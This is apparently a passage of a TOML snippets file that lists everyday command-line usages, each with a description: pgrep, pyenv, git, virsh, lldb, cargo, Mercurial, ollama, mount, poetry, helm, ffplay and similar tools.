  command = "rev <path/to/file>"
  output = ""

[[snippets]]
  description = "Return PIDs of any running processes with a matching command string"
  command = "pgrep <process_name>"
  output = ""

[[snippets]]
  description = "Search for processes including their command-line options"
  command = "pgrep --full ""<process_name> <parameter>"""
  output = ""

[[snippets]]
  description = "Search for processes run by a specific user"
  command = "pgrep --euid root <process_name>"
  output = ""

[[snippets]]
  description = "List all available commands"
  command = "pyenv commands"
  output = ""

[[snippets]]
  description = "List all Python versions under the `${PYENV_ROOT}/versions` directory"
  command = "pyenv versions"
  output = ""

[[snippets]]
  description = "List all Python versions that can be installed from upstream"
  command = "pyenv install --list"
  output = ""

[[snippets]]
  description = "Install a Python version under the `${PYENV_ROOT}/versions` directory"
  command = "pyenv install <2.7.10>"
  output = ""

[[snippets]]
  description = "Uninstall a Python version under the `${PYENV_ROOT}/versions` directory"
  command = "pyenv uninstall <2.7.10>"
  output = ""

[[snippets]]
  description = "Set Python version to be used globally in the current machine"
  command = "pyenv global <2.7.10>"
  output = ""

[[snippets]]
  description = "Set Python version to be used in the current directory and all directories below it"
  command = "pyenv local <2.7.10>"
  output = ""

[[snippets]]
  description = "Build a D source file"
  command = "dmd <path/to/source.d>"
  output = ""

[[snippets]]
  description = "Generate code for all template instantiations"
  command = "dmd -allinst"
  output = ""

[[snippets]]
  description = "Control bounds checking"
  command = "dmd -boundscheck=<on|safeonly|off>"
  output = ""

[[snippets]]
  description = "List information on all available checks"
  command = "dmd -check=<h|help|?>"
  output = ""

[[snippets]]
  description = "Turn on colored console output"
  command = "dmd -color"
  output = ""

[[snippets]]
  description = "Update packages to use new APIs"
  command = "go fix <packages>"
  output = ""

[[snippets]]
  description = "Play the given audio file"
  command = "play <path/to/audio_file>"
  output = ""

[[snippets]]
  description = "Play the given audio files"
  command = "play <path/to/audio_file1 path/to/audio_file2 ...>"
  output = ""

[[snippets]]
  description = "Play the given audio at twice the speed"
  command = "play <path/to/audio_file> speed 2.0"
  output = ""

[[snippets]]
  description = "Play the given audio in reverse"
  command = "play <path/to/audio_file> reverse"
  output = ""

[[snippets]]
  description = "Enlarge a PBM image by the specified factor with edge smoothing"
  command = "pbmpscale <N> <path/to/image.pbm> > <path/to/file.pbm>"
  output = ""

[[snippets]]
  description = "Bundle the edges of one or more graph layouts (that already have layout information)"
  command = "mingle <path/to/layout1.gv> <path/to/layout2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Perform layout, bundling, and output to a picture with one command"
  command = "dot <path/to/input.gv> | mingle | dot -T <png> > <path/to/output.png>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "mingle -?"
  output = ""

[[snippets]]
  description = "Decode an `adc` file to `wav`. (Default output name is `input.wav`)"
  command = "vgmstream_cli <path/to/input.adc> -o <path/to/output.wav>"
  output = ""

[[snippets]]
  description = "Print metadata without decoding the audio"
  command = "vgmstream_cli <path/to/input.adc> -m"
  output = ""

[[snippets]]
  description = "Decode an audio file without loops"
  command = "vgmstream_cli <path/to/input.adc> -o <path/to/output.wav> -i"
  output = ""

[[snippets]]
  description = "Decode with three loops, then add a 3s delay followed by a 5s fadeout"
  command = "vgmstream_cli <path/to/input.adc> -o <path/to/output.wav> -l <3.0> -f <5.0> -d <3.0>"
  output = ""

[[snippets]]
  description = "Convert multiple files to `bgm_(original name).wav` (Default `-o` pattern is `?f.wav`)"
  command = "vgmstream_cli -o <path/to/bgm_?f.wav> <path/to/file1.adc> <path/to/file2.adc>"
  output = ""

[[snippets]]
  description = "Play the file looping endlessly (`channels` and `rate` must match metadata)"
  command = "vgmstream_cli <path/to/input.adc> -pec | aplay --format cd --channels <1> --rate <44100>"
  output = ""

[[snippets]]
  description = "Delete only the virtual machine configuration file"
  command = "virsh undefine --domain <vm_name>"
  output = ""

[[snippets]]
  description = "Delete the configuration file and all associated storage volumes"
  command = "virsh undefine --domain <vm_name> --remove-all-storage"
  output = ""

[[snippets]]
  description = "Delete the configuration file and the specified storage volumes using the target name or the source name (as obtained from the `virsh domblklist` command)"
  command = "virsh undefine --domain <vm_name> --storage <sda,path/to/source>"
  output = ""

[[snippets]]
  description = "Debug an executable"
  command = "lldb <executable>"
  output = ""

[[snippets]]
  description = "Attach `lldb` to a running process with a given PID"
  command = "lldb -p <pid>"
  output = ""

[[snippets]]
  description = "Wait for a new process to launch with a given name, and attach to it"
  command = "lldb -w -n <process_name>"
  output = ""

[[snippets]]
  description = "Show a dependency tree of the current project"
  command = "cargo tree"
  output = ""

[[snippets]]
  description = "Only show dependencies up to the specified depth (e.g. when `n` is 1, display only direct dependencies)"
  command = "cargo tree --depth <n>"
  output = ""

[[snippets]]
  description = "Do not display the given package (and its dependencies) in the tree"
  command = "cargo tree --prune <package_spec>"
  output = ""

[[snippets]]
  description = "Show all occurrences of repeated dependencies"
  command = "cargo tree --no-dedupe"
  output = ""

[[snippets]]
  description = "Only show normal/build/development dependencies"
  command = "cargo tree --edges <normal|build|dev>"
  output = ""

[[snippets]]
  description = "Open a file for editing"
  command = "mg <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file at a specified line number"
  command = "mg +<line_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open files in a read-only mode"
  command = "mg -R <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Disable `~` backup files while editing"
  command = "mg -n <path/to/file>"
  output = ""

[[snippets]]
  description = "View current configuration values"
  command = "kaggle config view"
  output = ""

[[snippets]]
  description = "Download a specific file from a competition dataset"
  command = "kaggle competitions download <competition> -f <filename>"
  output = ""

[[snippets]]
  description = "Print the best common ancestor of two commits"
  command = "git merge-base <commit_1> <commit_2>"
  output = ""

[[snippets]]
  description = "Print all best common ancestors of two commits"
  command = "git merge-base --all <commit_1> <commit_2>"
  output = ""

[[snippets]]
  description = "Check if a commit is an ancestor of a specific commit"
  command = "git merge-base --is-ancestor <ancestor_commit> <commit>"
  output = ""

[[snippets]]
  description = "Fetch the latest changes from the default remote upstream repository (if set)"
  command = "git fetch"
  output = ""

[[snippets]]
  description = "Fetch new branches from a specific remote upstream repository"
  command = "git fetch <remote_name>"
  output = ""

[[snippets]]
  description = "Fetch the latest changes from all remote upstream repositories"
  command = "git fetch --all"
  output = ""

[[snippets]]
  description = "Also fetch tags from the remote upstream repository"
  command = "git fetch --tags"
  output = ""

[[snippets]]
  description = "Delete local references to remote branches that have been deleted upstream"
  command = "git fetch --prune"
  output = ""

[[snippets]]
  description = "Create an executable"
  command = "gdc <path/to/source.d> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Print information about module dependencies"
  command = "gdc -fdeps"
  output = ""

[[snippets]]
  description = "Generate Ddoc documentation"
  command = "gdc -fdoc"
  output = ""

[[snippets]]
  description = "Generate D interface files"
  command = "gdc -fintfc"
  output = ""

[[snippets]]
  description = "Do not link the standard GCC libraries in the compilation"
  command = "gdc -nostdlib"
  output = ""

[[snippets]]
  description = "Install a package and its dependencies"
  command = "tlmgr install <package>"
  output = ""

[[snippets]]
  description = "Remove a package and its dependencies"
  command = "tlmgr remove <package>"
  output = ""

[[snippets]]
  description = "Display information about a package"
  command = "tlmgr info <package>"
  output = ""

[[snippets]]
  description = "Update all packages"
  command = "tlmgr update --all"
  output = ""

[[snippets]]
  description = "Show possible updates without updating anything"
  command = "tlmgr update --list"
  output = ""

[[snippets]]
  description = "Start a GUI version of tlmgr"
  command = "tlmgr gui"
  output = ""

[[snippets]]
  description = "List all TeX Live configurations"
  command = "tlmgr conf"
  output = ""

[[snippets]]
  description = "Clone a repository to a specified directory"
  command = "hg clone <remote_repository_source> <destination_path>"
  output = ""

[[snippets]]
  description = "Clone a repository to the head of a specific branch, ignoring later commits"
  command = "hg clone --branch <branch> <remote_repository_source>"
  output = ""

[[snippets]]
  description = "Clone a repository with only the `.hg` directory, without checking out files"
  command = "hg clone --noupdate <remote_repository_source>"
  output = ""

[[snippets]]
  description = "Clone a repository to a specific revision, tag or branch, keeping the entire history"
  command = "hg clone --updaterev <revision> <remote_repository_source>"
  output = ""

[[snippets]]
  description = "Clone a repository up to a specific revision without any newer history"
  command = "hg clone --rev <revision> <remote_repository_source>"
  output = ""

[[snippets]]
  description = "Display the status of changed files"
  command = "hg status"
  output = ""

[[snippets]]
  description = "Display only modified files"
  command = "hg status --modified"
  output = ""

[[snippets]]
  description = "Display only added files"
  command = "hg status --added"
  output = ""

[[snippets]]
  description = "Display only removed files"
  command = "hg status --removed"
  output = ""

[[snippets]]
  description = "Display only deleted (but tracked) files"
  command = "hg status --deleted"
  output = ""

[[snippets]]
  description = "Display changes in the working directory compared to a specified changeset"
  command = "hg status --rev <revision>"
  output = ""

[[snippets]]
  description = "Display only files matching a specified glob pattern"
  command = "hg status --include <pattern>"
  output = ""

[[snippets]]
  description = "Display files, excluding those that match a specified glob pattern"
  command = "hg status --exclude <pattern>"
  output = ""

[[snippets]]
  description = "Start the daemon required to run other commands"
  command = "ollama serve"
  output = ""

[[snippets]]
  description = "Run a model and chat with it"
  command = "ollama run <model>"
  output = ""

[[snippets]]
  description = "Run a model with a single prompt"
  command = "ollama run <model> <prompt>"
  output = ""

[[snippets]]
  description = "List downloaded models"
  command = "ollama list"
  output = ""

[[snippets]]
  description = "Delete a model"
  command = "ollama rm <model>"
  output = ""

[[snippets]]
  description = "Create a model from a `Modelfile`"
  command = "ollama create <new_model_name> -f <path/to/Modelfile>"
  output = ""

[[snippets]]
  description = "Check if a DocBook XML file is valid"
  command = "daps -d <path/to/file.xml> validate"
  output = ""

[[snippets]]
  description = "Convert a DocBook XML file into PDF"
  command = "daps -d <path/to/file.xml> pdf"
  output = ""

[[snippets]]
  description = "Convert a DocBook XML file into a single HTML file"
  command = "daps -d <path/to/file.xml> html --single"
  output = ""

[[snippets]]
  description = "Display help"
  command = "daps --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "daps --version"
  output = ""

[[snippets]]
  description = "Render a `png` image with a filename based on the input filename and output format (uppercase -O)"
  command = "dot -T <png> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `svg` image with the specified output filename (lowercase -o)"
  command = "dot -T <svg> -o <path/to/image.svg> <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render the output in `ps`, `pdf`, `svg`, `fig`, `png`, `gif`, `jpg`, `json`, or `dot` format"
  command = "dot -T <format> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `gif` image using `stdin` and `stdout`"
  command = "echo ""<digraph {this -> that} >"" | dot -T <gif> > <path/to/image.gif>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "dot -?"
  output = ""

[[snippets]]
  description = "List all Object Storage buckets"
  command = "linode-cli object-storage buckets list"
  output = ""

[[snippets]]
  description = "Create a new Object Storage bucket"
  command = "linode-cli object-storage buckets create --cluster <cluster_id> --label <bucket_label>"
  output = ""

[[snippets]]
  description = "Delete an Object Storage bucket"
  command = "linode-cli object-storage buckets delete <cluster_id> <bucket_label>"
  output = ""

[[snippets]]
  description = "List Object Storage cluster regions"
  command = "linode-cli object-storage clusters list"
  output = ""

[[snippets]]
  description = "List access keys for Object Storage"
  command = "linode-cli object-storage keys list"
  output = ""

[[snippets]]
  description = "Create a new access key for Object Storage"
  command = "linode-cli object-storage keys create --label <label>"
  output = ""

[[snippets]]
  description = "Revoke an access key for Object Storage"
  command = "linode-cli object-storage keys revoke <access_key_id>"
  output = ""

[[snippets]]
  description = "Download a file"
  command = "rtmpdump --rtmp <rtmp://example.com/path/to/video> -o <file.ext>"
  output = ""

[[snippets]]
  description = "Download a file from a Flash player"
  command = "rtmpdump --rtmp <rtmp://example.com/path/to/video> --swfVfy <http://example.com/player> --flashVer ""<LNX 10,0,32,18>"" -o <file.ext>"
  output = ""

[[snippets]]
  description = "Specify connection parameters if they are not detected correctly"
  command = "rtmpdump --rtmp <rtmp://example.com/path/to/video> --app <app_name> --playpath <path/to/video> -o <file.ext>"
  output = ""

[[snippets]]
  description = "Download a file from a server that requires a referrer"
  command = "rtmpdump --rtmp <rtmp://example.com/path/to/video> --pageUrl <http://example.com/webpage> -o <file.ext>"
  output = ""

[[snippets]]
  description = "Search Google for a keyword"
  command = "googler <keyword>"
  output = ""

[[snippets]]
  description = "Search Google and open the first result in web browser"
  command = "googler -j <keyword>"
  output = ""

[[snippets]]
  description = "Show N search results (default 10)"
  command = "googler -n <N> <keyword>"
  output = ""

[[snippets]]
  description = "Disable automatic spelling correction"
  command = "googler -x <keyword>"
  output = ""

[[snippets]]
  description = "Search one site for a keyword"
  command = "googler -w <site> <keyword>"
  output = ""

[[snippets]]
  description = "Show Google search result in JSON format"
  command = "googler --json <keyword>"
  output = ""

[[snippets]]
  description = "Perform in-place self-upgrade"
  command = "googler -u"
  output = ""

[[snippets]]
  description = "Display help in interactive mode"
  command = "?"
  output = ""

[[snippets]]
  description = "Join all the lines into a single line, using TAB as delimiter"
  command = "paste -s <path/to/file>"
  output = ""

[[snippets]]
  description = "Join all the lines into a single line, using the specified delimiter"
  command = "paste -s -d <delimiter> <path/to/file>"
  output = ""

[[snippets]]
  description = "Merge two files side by side, each in its column, using TAB as delimiter"
  command = "paste <file1> <file2>"
  output = ""

[[snippets]]
  description = "Merge two files side by side, each in its column, using the specified delimiter"
  command = "paste -d <delimiter> <file1> <file2>"
  output = ""

[[snippets]]
  description = "Merge two files, with lines added alternatively"
  command = "paste -d '\n' <file1> <file2>"
  output = ""

[[snippets]]
  description = "Start the storage pool specified by name or UUID (determine using `virsh pool-list`) and create the underlying storage system if it doesn't exist"
  command = "virsh pool-start --pool <name|uuid> --build"
  output = ""

[[snippets]]
  description = "Yank the specified version of a crate"
  command = "cargo yank <crate>@<version>"
  output = ""

[[snippets]]
  description = "Undo a yank (i.e. allow downloading it again)"
  command = "cargo yank --undo <crate>@<version>"
  output = ""

[[snippets]]
  description = "Use the specified registry (registry names can be defined in the configuration - the default is <https://crates.io>)"
  command = "cargo yank --registry <name> <crate>@<version>"
  output = ""

[[snippets]]
  description = "Enable module "foo""
  command = "drush en <foo>"
  output = ""

[[snippets]]
  description = "Uninstall module "foo""
  command = "drush pmu <foo>"
  output = ""

[[snippets]]
  description = "Clear all caches"
  command = "drush cr"
  output = ""

[[snippets]]
  description = "Clear CSS and JavaScript caches"
  command = "drush cc css-js"
  output = ""

[[snippets]]
  description = "Open the project in the current directory using the correct Unity version"
  command = "u3d"
  output = ""

[[snippets]]
  description = "List installed versions of Unity"
  command = "u3d list"
  output = ""

[[snippets]]
  description = "List available versions of Unity that can be downloaded"
  command = "u3d available"
  output = ""

[[snippets]]
  description = "Download and install latest stable Unity version"
  command = "u3d install latest_stable"
  output = ""

[[snippets]]
  description = "Download and install Unity version and editor [p]ackages"
  command = "u3d install <2021.2.0f1> -p <Unity,iOS,Android>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "xonsh"
  output = ""

[[snippets]]
  description = "Execute a single command and then exit"
  command = "xonsh -c ""<command>"""
  output = ""

[[snippets]]
  description = "Run commands from a script file and then exit"
  command = "xonsh <path/to/script_file.xonsh>"
  output = ""

[[snippets]]
  description = "Define environment variables for the shell process"
  command = "xonsh -D<name1>=<value1> -D<name2>=<value2>"
  output = ""

[[snippets]]
  description = "Load the specified `.xonsh` or `.json` configuration files"
  command = "xonsh --rc <path/to/file1.xonsh> <path/to/file2.json>"
  output = ""

[[snippets]]
  description = "Skip loading the `.xonshrc` configuration file"
  command = "xonsh --no-rc"
  output = ""

[[snippets]]
  description = "Remove a killed or finished task"
  command = "pueue remove <task_id>"
  output = ""

[[snippets]]
  description = "Remove multiple tasks at once"
  command = "pueue remove <task_id> <task_id>"
  output = ""

[[snippets]]
  description = "Print logs from a container"
  command = "docker logs <container_name>"
  output = ""

[[snippets]]
  description = "Print logs and follow them"
  command = "docker logs -f <container_name>"
  output = ""

[[snippets]]
  description = "Print last 5 lines"
  command = "docker logs <container_name> --tail <5>"
  output = ""

[[snippets]]
  description = "Print logs and append them with timestamps"
  command = "docker logs -t <container_name>"
  output = ""

[[snippets]]
  description = "Print logs from a certain point in time of container execution (i.e. 23m, 10s, 2013-01-02T13:23:37)"
  command = "docker logs <container_name> --until <time>"
  output = ""

[[snippets]]
  description = "Go to the specified directory"
  command = "cd <path/to/directory>"
  output = ""

[[snippets]]
  description = "Go up to the parent of the current directory"
  command = "cd .."
  output = ""

[[snippets]]
  description = "Go to the home directory of the current user"
  command = "cd"
  output = ""

[[snippets]]
  description = "Go to the home directory of the specified user"
  command = "cd ~<username>"
  output = ""

[[snippets]]
  description = "Go to the previously chosen directory"
  command = "cd -"
  output = ""

[[snippets]]
  description = "Go to the root directory"
  command = "cd /"
  output = ""

[[snippets]]
  description = "Show all mounted filesystems"
  command = "mount"
  output = ""

[[snippets]]
  description = "Mount a device to a directory"
  command = "mount -t <filesystem_type> <path/to/device_file> <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Create a specific directory if it does not exist and mount a device to it"
  command = "mount --mkdir <path/to/device_file> <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Mount a device to a directory for a specific user"
  command = "mount -o uid=<user_id>,gid=<group_id> <path/to/device_file> <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Mount a CD-ROM device (with the filetype ISO9660) to `/cdrom` (readonly)"
  command = "mount -t <iso9660> -o ro </dev/cdrom> </cdrom>"
  output = ""

[[snippets]]
  description = "Mount all the filesystem defined in `/etc/fstab`"
  command = "mount -a"
  output = ""

[[snippets]]
  description = "Mount a specific filesystem described in `/etc/fstab` (e.g. `/dev/sda1 /my_drive ext2 defaults 0 2`)"
  command = "mount </my_drive>"
  output = ""

[[snippets]]
  description = "Mount a directory to another directory"
  command = "mount --bind <path/to/old_dir> <path/to/new_dir>"
  output = ""

[[snippets]]
  description = "List mail"
  command = "from"
  output = ""

[[snippets]]
  description = "Display the number of messages stored"
  command = "from --count"
  output = ""

[[snippets]]
  description = "List mail in the specified mailbox directory"
  command = "MAIL=<path/to/mailbox> from"
  output = ""

[[snippets]]
  description = "Print the mail from the specified address"
  command = "from --sender=<me@example.com>"
  output = ""

[[snippets]]
  description = "Delay in seconds"
  command = "sleep <seconds>"
  output = ""

[[snippets]]
  description = "Execute a specific command after 20 seconds delay"
  command = "sleep 20 && <command>"
  output = ""

[[snippets]]
  description = "Create a new Poetry project in the directory with a specific name"
  command = "poetry new <project_name>"
  output = ""

[[snippets]]
  description = "Install and add a dependency and its sub-dependencies to the `pyproject.toml` file in the current directory"
  command = "poetry add <dependency>"
  output = ""

[[snippets]]
  description = "Install the project dependencies using the `pyproject.toml` file in the current directory"
  command = "poetry install"
  output = ""

[[snippets]]
  description = "Interactively initialize the current directory as a new Poetry project"
  command = "poetry init"
  output = ""

[[snippets]]
  description = "Get the latest version of all dependencies and update `poetry.lock`"
  command = "poetry update"
  output = ""

[[snippets]]
  description = "Execute a command inside the project's virtual environment"
  command = "poetry run <command>"
  output = ""

[[snippets]]
  description = "Bump the minor version of the project in `pyproject.toml`"
  command = "poetry version minor"
  output = ""

[[snippets]]
  description = "Start `meld`"
  command = "meld"
  output = ""

[[snippets]]
  description = "Compare 2 files"
  command = "meld <path/to/file_1> <path/to/file_2>"
  output = ""

[[snippets]]
  description = "Compare 2 directories"
  command = "meld <path/to/directory_1> <path/to/directory_2>"
  output = ""

[[snippets]]
  description = "Compare 3 files"
  command = "meld <path/to/file_1> <path/to/file_2> <path/to/file_3>"
  output = ""

[[snippets]]
  description = "Open a comparison as a new tab in a pre-existing meld instance"
  command = "meld --newtab <path/to/file_1> <path/to/file_2>"
  output = ""

[[snippets]]
  description = "Compare multiple sets of files"
  command = "meld --diff <path/to/file_1> <path/to/file_2> --diff <path/to/file_3> <path/to/file_4>"
  output = ""

[[snippets]]
  description = "Install a specific version of Node.js"
  command = "nodenv install <version>"
  output = ""

[[snippets]]
  description = "Display a list of available versions"
  command = "nodenv install --list"
  output = ""

[[snippets]]
  description = "Use a specific version of Node.js across the whole system"
  command = "nodenv global <version>"
  output = ""

[[snippets]]
  description = "Use a specific version of Node.js with a directory"
  command = "nodenv local <version>"
  output = ""

[[snippets]]
  description = "Display the Node.js version for the current directory"
  command = "nodenv version"
  output = ""

[[snippets]]
  description = "Display the location of a Node.js installed command (e.g. `npm`)"
  command = "nodenv which <command>"
  output = ""

[[snippets]]
  description = "Rebase the current branch on top of another specified branch"
  command = "git rebase <new_base_branch>"
  output = ""

[[snippets]]
  description = "Start an interactive rebase, which allows the commits to be reordered, omitted, combined or modified"
  command = "git rebase -i <target_base_branch_or_commit_hash>"
  output = ""

[[snippets]]
  description = "Continue a rebase that was interrupted by a merge failure, after editing conflicting files"
  command = "git rebase --continue"
  output = ""

[[snippets]]
  description = "Continue a rebase that was paused due to merge conflicts, by skipping the conflicted commit"
  command = "git rebase --skip"
  output = ""

[[snippets]]
  description = "Abort a rebase in progress (e.g. if it is interrupted by a merge conflict)"
  command = "git rebase --abort"
  output = ""

[[snippets]]
  description = "Move part of the current branch onto a new base, providing the old base to start from"
  command = "git rebase --onto <new_base> <old_base>"
  output = ""

[[snippets]]
  description = "Reapply the last 5 commits in-place, stopping to allow them to be reordered, omitted, combined or modified"
  command = "git rebase -i <HEAD~5>"
  output = ""

[[snippets]]
  description = "Auto-resolve any conflicts by favoring the working branch version (`theirs` keyword has reversed meaning in this case)"
  command = "git rebase -X theirs <branch_name>"
  output = ""

[[snippets]]
  description = "Create a helm chart"
  command = "helm create <chart_name>"
  output = ""

[[snippets]]
  description = "Add a new helm repository"
  command = "helm repo add <repository_name>"
  output = ""

[[snippets]]
  description = "List helm repositories"
  command = "helm repo list"
  output = ""

[[snippets]]
  description = "Update helm repositories"
  command = "helm repo update"
  output = ""

[[snippets]]
  description = "Delete a helm repository"
  command = "helm repo remove <repository_name>"
  output = ""

[[snippets]]
  description = "Install a helm chart"
  command = "helm install <name> <repository_name>/<chart_name>"
  output = ""

[[snippets]]
  description = "Download helm chart as a `tar` archive"
  command = "helm get <chart_release_name>"
  output = ""

[[snippets]]
  description = "Update helm dependencies"
  command = "helm dependency update"
  output = ""

[[snippets]]
  description = "Build a specific C project in the current directory"
  command = "verilator --binary --build-jobs 0 -Wall <path/to/source.v>"
  output = ""

[[snippets]]
  description = "Create a C++ executable in a specific folder"
  command = "verilator --cc --exe --build --build-jobs 0 -Wall <path/to/source.cpp> <path/to/output.v>"
  output = ""

[[snippets]]
  description = "Perform linting over a code in the current directory"
  command = "verilator --lint-only -Wall"
  output = ""

[[snippets]]
  description = "Create XML output about the design (files, modules, instance hierarchy, logic and data types) to feed into other tools"
  command = "verilator --xml-output -Wall <path/to/output.xml>"
  output = ""

[[snippets]]
  description = "Inspect the headers of a file"
  command = "xsv headers <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Count the number of entries"
  command = "xsv count <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Get an overview of the shape of entries"
  command = "xsv stats <path/to/file.csv> | xsv table"
  output = ""

[[snippets]]
  description = "Select a few columns"
  command = "xsv select <column1,column2> <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Show 10 random entries"
  command = "xsv sample <10> <path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Join a column from one file to another"
  command = "xsv join --no-case <column1> <path/to/file1.csv> <column2> <path/to/file2.csv> | xsv table"
  output = ""

[[snippets]]
  description = "Play a media file"
  command = "ffplay <path/to/file>"
  output = ""

[[snippets]]
  description = "Play audio from a media file without a GUI"
  command = "ffplay -nodisp <path/to/file>"
  output = ""

[[snippets]]
  description = "Play media passed by `ffmpeg` through `stdin`"
  command = "ffmpeg -i <path/to/file> -c <copy> -f <media_format> - | ffplay -"
  output = ""

[[snippets]]
  description = "Play a video and show motion vectors in real time"
  command = "ffplay -flags2 +export_mvs -vf codecview=mv=pf+bf+bb <path/to/file>"
  output = ""

[[snippets]]
  description = "Show only video keyframes"
  command = "ffplay -vf select=""<eq(pict_type\,PICT_TYPE_I)>"" <path/to/file>"
  output = ""

[[snippets]]
  description = "Convert a ESC/P2 printer file to a PBM image"
  command = "escp2topbm <path/to/image.escp2> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Interactively show the disk usage of the current directory"
  command = "gdu"
  output = ""

[[snippets]]
  description = "Interactively show the disk usage of a given directory"
  command = "gdu <path/to/directory>"
  output = ""

[[snippets]]
  description = "Interactively show the disk usage of all mounted disks"
  command = "gdu --show-disks"
  output = ""

[[snippets]]
  description = "Interactively show the disk usage of the current directory but ignore some sub-directories"
  command = "gdu --ignore-dirs <path/to/directory1,path/to/directory2,...>"
  output = ""

[[snippets]]
  description = "Ignore paths by regular expression"
  command = "gdu --ignore-dirs-pattern '<.*[abc]+>'"
  output = ""

[[snippets]]
  description = "Ignore hidden directories"
  command = "gdu --no-hidden"
  output = ""

[[snippets]]
  description = "Only print the result, do not enter interactive mode"
  command = "gdu --non-interactive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Do not show the progress in non-interactive mode (useful in scripts)"
  command = "gdu --no-progress <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "carp"
  output = ""

[[snippets]]
  description = "Start a REPL with a custom prompt"
  command = "carp --prompt ""<> >"""
  output = ""

[[snippets]]
  description = "Build a `carp` file"
  command = "carp -b <path/to/file.carp>"
  output = ""

[[snippets]]
  description = "Build and run a file"
  command = "carp -x <path/to/file.carp>"
  output = ""

[[snippets]]
  description = "Build a file with optimizations enabled"
  command = "carp -b --optimize <path/to/file.carp>"
  output = ""

[[snippets]]
  description = "Transpile a file to C code"
  command = "carp --generate-only <path/to/file.carp>"
  output = ""

[[snippets]]
  description = "List all the extensions created by a publisher"
  command = "vsce list <publisher>"
  output = ""

[[snippets]]
  description = "Publish an extension as major, minor or patch version"
  command = "vsce publish <major|minor|patch>"
  output = ""

[[snippets]]
  description = "Unpublish an extension"
  command = "vsce unpublish <extension_id>"
  output = ""

[[snippets]]
  description = "Package the current working directory as a `.vsix` file"
  command = "vsce package"
  output = ""

[[snippets]]
  description = "Show the metadata associated with an extension"
  command = "vsce show <extension_id>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr zstd"
  output = ""

[[snippets]]
  description = "List available diff tools"
  command = "git difftool --tool-help"
  output = ""

[[snippets]]
  description = "Set the default diff tool to meld"
  command = "git config --global diff.tool ""<meld>"""
  output = ""

[[snippets]]
  description = "Use the default diff tool to show staged changes"
  command = "git difftool --staged"
  output = ""

[[snippets]]
  description = "Use a specific tool (opendiff) to show changes since a given commit"
  command = "git difftool --tool=<opendiff> <commit>"
  output = ""

[[snippets]]
  description = "Register a node at a Puppet server and apply the received catalog"
  command = "puppet agent --test --server <puppetserver_fqdn> --serverport <port> --waitforcert <poll_time>"
  output = ""

[[snippets]]
  description = "Run the agent in the background (uses settings from `puppet.conf`)"
  command = "puppet agent"
  output = ""

[[snippets]]
  description = "Run the agent once in the foreground, then exit"
  command = "puppet agent --test"
  output = ""

[[snippets]]
  description = "Run the agent in dry-mode"
  command = "puppet agent --test --noop"
  output = ""

[[snippets]]
  description = "Log every resource being evaluated (even if nothing is being changed)"
  command = "puppet agent --test --evaltrace"
  output = ""

[[snippets]]
  description = "Disable the agent"
  command = "puppet agent --disable ""<message>"""
  output = ""

[[snippets]]
  description = "Enable the agent"
  command = "puppet agent --enable"
  output = ""

[[snippets]]
  description = "Display Android app manifest"
  command = "androguard axml <path/to/app.apk>"
  output = ""

[[snippets]]
  description = "Display app metadata (version and app ID)"
  command = "androguard apkid <path/to/app.apk>"
  output = ""

[[snippets]]
  description = "Decompile Java code from an app"
  command = "androguard decompile <path/to/app.apk> --output <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create a sparsified compressed image without snapshots from an unsparsified one"
  command = "virt-sparsify --compress <path/to/image.qcow2> <path/to/image_new.qcow2>"
  output = ""

[[snippets]]
  description = "Sparsify an image in-place"
  command = "virt-sparsify --in-place <path/to/image.img>"
  output = ""

[[snippets]]
  description = "Compile one or more C# files to a CIL executable"
  command = "csc <path/to/input_file_a.cs> <path/to/input_file_b.cs>"
  output = ""

[[snippets]]
  description = "Specify the output filename"
  command = "csc /out:<path/to/filename> <path/to/input_file.cs>"
  output = ""

[[snippets]]
  description = "Compile into a `.dll` library instead of an executable"
  command = "csc /target:library <path/to/input_file.cs>"
  output = ""

[[snippets]]
  description = "Reference another assembly"
  command = "csc /reference:<path/to/library.dll> <path/to/input_file.cs>"
  output = ""

[[snippets]]
  description = "Embed a resource"
  command = "csc /resource:<path/to/resource_file> <path/to/input_file.cs>"
  output = ""

[[snippets]]
  description = "Automatically generate XML documentation"
  command = "csc /doc:<path/to/output.xml> <path/to/input_file.cs>"
  output = ""

[[snippets]]
  description = "Specify an icon"
  command = "csc /win32icon:<path/to/icon.ico> <path/to/input_file.cs>"
  output = ""

[[snippets]]
  description = "Strongly-name the resulting assembly with a keyfile"
  command = "csc /keyfile:<path/to/keyfile> <path/to/input_file.cs>"
  output = ""

[[snippets]]
  description = "List available action plugins (modules)"
  command = "ansible-doc --list"
  output = ""

[[snippets]]
  description = "List available plugins of a specific type"
  command = "ansible-doc --type <become|cache|callback|cliconf|connection|...> --list"
  output = ""

[[snippets]]
  description = "Show information about a specific action plugin (module)"
  command = "ansible-doc <plugin_name>"
  output = ""

[[snippets]]
  description = "Show information about a plugin with a specific type"
  command = "ansible-doc --type <become|cache|callback|cliconf|connection|...> <plugin_name>"
  output = ""

[[snippets]]
  description = "Show the playbook snippet for action plugin (modules)"
  command = "ansible-doc --snippet <plugin_name>"
  output = ""

[[snippets]]
  description = "Show information about an action plugin (module) as JSON"
  command = "ansible-doc --json <plugin_name>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr pio project"
  output = ""

[[snippets]]
